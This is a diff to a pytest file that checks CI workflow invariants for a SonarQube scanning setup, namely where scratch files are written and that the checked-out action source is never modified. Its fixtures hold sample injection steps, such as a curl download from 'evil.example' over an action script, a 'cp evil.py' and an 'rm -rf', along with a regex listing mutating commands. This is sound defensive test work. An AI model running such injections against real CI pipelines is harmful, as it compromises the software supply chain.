@@ -21,7 +21,10 @@ tests pin the invariants that layout depends on:
   path before use, independent of what an earlier job on the same runner
   left behind there; and
 * no `run:` step writes its intermediate files to a workspace-relative path -
-  scratch files go under $RUNNER_TEMP instead.
+  scratch files go under $RUNNER_TEMP instead (redirects, `tee`, `cp`/`mv`,
+  `-o`/`--out`-style flags, following local variable assignments);
+* no step after the ``.sast-sonarqube`` checkout mentions that directory
+  except to read from it.
 
 And, for the scanner-mode dotnet trust boundary (sonar-pr.yml):
 
@@ -32,6 +35,7 @@ And, for the scanner-mode dotnet trust boundary (sonar-pr.yml):
 * the PR head checkout checks out the SHA resolve_pr_context.py resolved
   (on a dispatch, the maintainer-reviewed one), into ``src``.
 """
+import posixpath
 import re
 from pathlib import Path
 
@@ -56,7 +60,18 @@ ALLOWED_TARGET_PREFIXES = ("$RUNNER_TEMP/", "${RUNNER_TEMP}/")
 ARITHMETIC = re.compile(r"\(\(.*?\)\)")
 REDIRECT = re.compile(r"\d?>>?(?!&)\s*([^\s;|&)]+)")
 TEE = re.compile(r"\btee(?:\s+-a)?\s+([^\s;|&)]+)")
-OUTPUT_FLAG = re.compile(r"--(?:out|removed-out|result-out|dest)[\s=]+([^\s;|&)]+)")
+OUTPUT_FLAG = re.compile(r"--(?:out|removed-out|result-out|dest|output)[\s=]+([^\s;|&)]+)")
+# Ported from #54's scripts/check_checkout_order.py (a11bf90):
+# short `-o value` / `-o=value`, excluding `set -o <shell-option>` (and
+# `set -euo pipefail`, where -o isn't a separate token anyway).
+SHORT_OUTPUT_FLAG = re.compile(r"(?<!\S)(?<!set )-o(?:=|\s+)([^\s;|&)]+)")
+# `cp`/`mv`: their arguments up to the next pipe/control operator or end
+# of line; only the last (destination) one is written.
+CP_MV_ARGS = re.compile(r"(?<!\S)(?:cp|mv)\b([^|;&\n]*)")
+# One-line `name=value` / `name="value"` assignments, so a path assigned
+# to a local variable once is checked as that path, not as "$name".
+ASSIGNMENT = re.compile(r"^\s*([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
+VAR_REF = re.compile(r"^\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")
 
 
 def _steps(workflow):
@@ -74,29 +89,94 @@ def _scan_steps(workflow):
                 yield job_name, step
 
 
+def _local_assignments(text):
+    assignments = {}
+    for line in text.splitlines():
+        match = ASSIGNMENT.match(line)
+        if match:
+            name, value = match.groups()
+            assignments[name] = value.strip().strip("\"'")
+    return assignments
+
+
+def _resolve_target(target, assignments, seen=frozenset()):
+    """Follow a bare `$VAR`/`${VAR}` to its value assigned in the same
+    `run:` block. Anything else (or a cycle, or a variable never assigned
+    there) is returned unchanged - and so is never mistaken for an allowed
+    $RUNNER_TEMP path."""
+    match = VAR_REF.match(target)
+    if not match or match.group(1) in seen or match.group(1) not in assignments:
+        return target
+    return _resolve_target(assignments[match.group(1)], assignments, seen | {match.group(1)})
+
+
 def _write_targets(script):
     lines = [line for line in script.splitlines() if not line.lstrip().startswith("#")]
     # Drop bash arithmetic `(( ... ))`, where `>` is a comparison.
     text = ARITHMETIC.sub("", "\n".join(lines))
-    for pattern in (REDIRECT, TEE, OUTPUT_FLAG):
+    assignments = _local_assignments(text)
+    targets = []
+    for pattern in (REDIRECT, TEE, OUTPUT_FLAG, SHORT_OUTPUT_FLAG):
         for match in pattern.finditer(text):
-            yield match.group(1).strip("\"'")
+            targets.append((match.start(), match.group(1).strip("\"'")))
+    for match in CP_MV_ARGS.finditer(text):
+        args = [a.strip("\"'") for a in match.group(1).split() if not a.startswith("-")]
+        if len(args) >= 2:
+            targets.append((match.start(), args[-1]))
+    for _, target in sorted(targets, key=lambda t: t[0]):
+        yield _resolve_target(target, assignments)
 
 
 def _is_allowed_target(target):
     return target in ALLOWED_EXACT_TARGETS or target.startswith(ALLOWED_TARGET_PREFIXES)
 
 
+# Commands that change files; a line naming `.sast-sonarqube` alongside
+# one of these (or a redirect) is treated as modifying it.
+MUTATING_COMMAND = re.compile(
+    r"(?<![\w./-])(?:rm|rmdir|ln|cp|mv|curl|wget|tee|chmod|chown|touch|mkdir|install|tar|unzip|"
+    r"git|rsync|dd|truncate|patch)(?![\w./-])|(?<![\w-])sed\s+(?:-\w*\s+)*-i|>"
+)
+# A read of a file inside the action source: `.sast-sonarqube/<path>`.
+ACTION_SOURCE_READ = re.compile(r"(?<![\w./-])\.sast-sonarqube/[\w./-]+")
+
+
+def _only_reads_action_source(step):
+    """True when `step` touches `.sast-sonarqube` only to read from it:
+    `uses: ./.sast-sonarqube`, or `run:` lines that name a file inside it
+    (to run a script, or read its compose file) with no command that
+    writes. Anything else mentioning it - a bare `.sast-sonarqube`
+    argument, a mutating command, `working-directory:` or a checkout
+    `path:` into it - counts as modifying it."""
+    for key, value in step.items():
+        if key == "uses" and value == SCANNER_ACTION_USES:
+            continue
+        if key == "run":
+            for line in str(value).splitlines():
+                if ".sast-sonarqube" not in line:
+                    continue
+                if MUTATING_COMMAND.search(line):
+                    return False
+                if ".sast-sonarqube" in ACTION_SOURCE_READ.sub("", line):
+                    return False
+            continue
+        if ".sast-sonarqube" in str(value):
+            return False
+    return True
+
+
 def _lies_under(sibling, prefix_dir):
     """Whether `sibling` (a fixed, top-level directory name) lies under
     `prefix_dir` (the literal, non-templated portion of a project-base-dir
-    value). Everything lies under the workspace root; otherwise, since every
-    sibling directory lives directly at the workspace root, only a strict
-    descendant relationship counts - `prefix_dir` being the sibling itself
-    (e.g. scanning `.baseline-checkout` directly) is not "under"."""
-    if prefix_dir in ("", ".", "./"):
+    value), after normalizing `.`/`..` segments (so `src/..` is the
+    workspace root). Everything lies under the workspace root; otherwise,
+    since every sibling directory lives directly at the workspace root, only
+    a strict descendant relationship counts - `prefix_dir` being the sibling
+    itself (e.g. scanning `.baseline-checkout` directly) is not "under"."""
+    normalized = posixpath.normpath(prefix_dir) if prefix_dir else "."
+    if normalized == "." or normalized.startswith("../") or normalized == "..":
         return True
-    return sibling.startswith(prefix_dir.rstrip("/") + "/")
+    return sibling.startswith(normalized.rstrip("/") + "/")
 
 
 def _checkout_steps(steps):
@@ -305,3 +385,100 @@ def test_allowed_targets():
 )
 def test_lies_under(sibling, prefix_dir, expected):
     assert _lies_under(sibling, prefix_dir) == expected
+
+
+# --- broader write detection (ported from #54's check_checkout_order.py) -----
+
+
+@pytest.mark.parametrize(
+    "script, expected",
+    [
+        # cp/mv: only the last (destination) argument is written.
+        ("cp -f a.json b.json", ["b.json"]),
+        ('mv "${RUNNER_TEMP}/x" out.json', ["out.json"]),
+        ("cp a.json", []),
+        # Short -o / -o=, but never `set -o <option>`.
+        ("curl -sS -o report.json https://x", ["report.json"]),
+        ("curl -o=report.json https://x", ["report.json"]),
+        ("set -o pipefail", []),
+        ("set -euo pipefail", []),
+        ("tool --output result.json", ["result.json"]),
+        # A local variable is resolved to what it was assigned.
+        ('f="${RUNNER_TEMP}/sonar-pr/a.json"\necho x > "$f"', ["${RUNNER_TEMP}/sonar-pr/a.json"]),
+        ('f=bare.json\necho x > "${f}"', ["bare.json"]),
+        ('echo x > "$unassigned"', ["$unassigned"]),
+        ('a="$b"\nb=bare.json\necho x > "$a"', ["bare.json"]),
+        ('a="$a"\necho x > "$a"', ["$a"]),
+    ],
+)
+def test_broader_write_target_extraction(script, expected):
+    assert list(_write_targets(script)) == expected
+
+
+# --- nothing after the action-source checkout modifies it --------------------
+
+
+def _action_source_violations(steps):
+    """Names of steps after the `.sast-sonarqube` checkout that mention
+    `.sast-sonarqube` other than to read from it (run a script in it, use
+    it as the composite action, read its compose file)."""
+    checkout = next(
+        i
+        for i, s in enumerate(steps)
+        if str(s.get("uses", "")).startswith("actions/checkout@")
+        and (s.get("with") or {}).get("path") == ".sast-sonarqube"
+    )
+    return [
+        step.get("name") or f"step[{i}]"
+        for i, step in enumerate(steps)
+        if i > checkout and not _only_reads_action_source(step)
+    ]
+
+
+@pytest.mark.parametrize("workflow", WORKFLOWS)
+def test_nothing_after_the_action_source_checkout_modifies_it(workflow):
+    for job_name, steps in _steps(workflow):
+        assert _action_source_violations(steps) == [], f"{workflow}:{job_name}"
+
+
+_INJECTED_STEPS = {
+    "cp into it": {"name": "inject", "run": "cp evil.py .sast-sonarqube/scripts/apply_policy.py"},
+    "curl -o into it": {
+        "name": "inject",
+        "run": "curl -sSfL -o .sast-sonarqube/scripts/diff_findings.py https://evil.example",
+    },
+    "rm it after the checkout": {"name": "inject", "run": "rm -rf -- ./.sast-sonarqube"},
+    "ln -sfn over it": {"name": "inject", "run": "ln -sfn src/.sast-sonarqube .sast-sonarqube"},
+    "mv over it": {"name": "inject", "run": "mv src/x .sast-sonarqube"},
+    "redirect into it": {"name": "inject", "run": "echo x > .sast-sonarqube/action.yml"},
+    "sed -i on it": {"name": "inject", "run": "sed -i s/a/b/ .sast-sonarqube/scripts/run_scan.sh"},
+    "run inside it": {"name": "inject", "working-directory": ".sast-sonarqube", "run": "make"},
+    "second checkout into it": {
+        "name": "inject",
+        "uses": "actions/checkout@v7",
+        "with": {"path": ".sast-sonarqube"},
+    },
+}
+
+
+@pytest.mark.parametrize("mutation", sorted(_INJECTED_STEPS))
+def test_modifying_the_action_source_after_its_checkout_is_caught(mutation):
+    steps = list(_pr_steps())
+    # Injected right before "Scan PR head", well after the checkout.
+    steps.insert(_index_of(steps, "Scan PR head"), _INJECTED_STEPS[mutation])
+    assert "inject" in _action_source_violations(steps)
+
+
+@pytest.mark.parametrize(
+    "prefix_dir",
+    ["src/..", "src/../", "./src/..", "src/./..", "src/x/../.."],
+)
+def test_lies_under_normalizes_dot_dot(prefix_dir):
+    assert _lies_under(".sast-sonarqube", prefix_dir)
+    assert _lies_under(".baseline-checkout", prefix_dir)
+
+
+def test_scanning_src_dot_dot_is_caught():
+    value = "src/../${{ inputs.project-base-dir }}"
+    prefix_dir = value.split("${{", 1)[0].rstrip("/")
+    assert any(_lies_under(sibling, prefix_dir) for sibling in SIBLING_DIRS)
